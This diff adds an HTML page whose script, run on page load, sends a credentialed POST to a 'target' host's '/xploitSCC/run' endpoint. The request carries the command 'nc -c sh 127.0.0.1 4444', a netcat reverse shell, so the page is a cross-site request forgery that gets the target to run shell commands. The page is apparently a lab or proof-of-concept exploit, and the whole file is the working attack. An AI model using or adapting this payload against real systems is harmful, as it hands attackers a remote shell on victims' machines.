@@ -1,0 +1,20 @@
+<html>
+<body>
+
+<script>
+  fetch("http://target:8000/xploitSCC/run", {
+        method: "POST",
+        body: JSON.stringify({"instructions" : "nc -c sh 127.0.0.1 4444"}),
+        headers: {
+          'Content-Type': 'application/json'                          
+        },
+        credentials: 'include'
+    })
+    .then(response => response.text())
+    .then((response) => {
+        console.log("Done.");
+    });
+</script>
+
+</body>
+</html>
